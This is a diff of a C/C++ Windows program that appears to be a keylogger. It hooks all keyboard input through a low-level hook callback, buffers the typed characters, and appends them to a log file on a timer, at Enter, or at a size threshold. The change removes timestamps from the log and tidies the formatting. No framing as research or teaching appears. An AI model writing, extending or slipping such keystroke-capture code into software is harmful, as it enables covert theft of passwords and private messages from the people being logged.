@@ -34,21 +34,16 @@ char getTypedChar(DWORD vkCode, DWORD scanCode) {
     return '\0';
 }
 
-
-void flushBuffer(bool withTimestamp)
+void flushBuffer()
 {
-    if (index == 0) return;
+    if (index == 0)
+        return;
 
     // append mode
-    FILE* file = fopen(LOG_FILE_PATH, "a+");
-    if (file) {
-        if (withTimestamp) {
-            time_t now = time(0);
-            struct tm* t = localtime(&now);
-            fprintf(file, "[%04d-%02d-%02d %02d:%02d:%02d] ",
-                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
-                t->tm_hour, t->tm_min, t->tm_sec);
-        }
+    FILE *file = fopen(LOG_FILE_PATH, "a+");
+    if (file)
+    {
+
         buffer[index] = '\0';
         fprintf(file, "%s\n", buffer);
         fclose(file);
@@ -69,19 +64,17 @@ LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
     {
         KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = p->vkCode;
-        bool flushWithTimestamp = false;
 
         time_t now = time(0);
         if (now - lastKeypressTime >= FLUSH_INTERVAL) {
-            flushWithTimestamp = true;
-            flushBuffer(flushWithTimestamp);
+            flushBuffer();
         }
 
         lastKeypressTime = now;
 
         if (vkCode == VK_RETURN)
         {
-            flushBuffer(flushWithTimestamp);
+            flushBuffer();
         }
         else if (vkCode == VK_BACK && index > 0)
         {
@@ -124,7 +117,7 @@ LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
         }
 
         if (index >= FLUSH_CHAR_THRESHOLD - 1) {
-            flushBuffer(flushWithTimestamp);
+            flushBuffer();
         }
     }
 
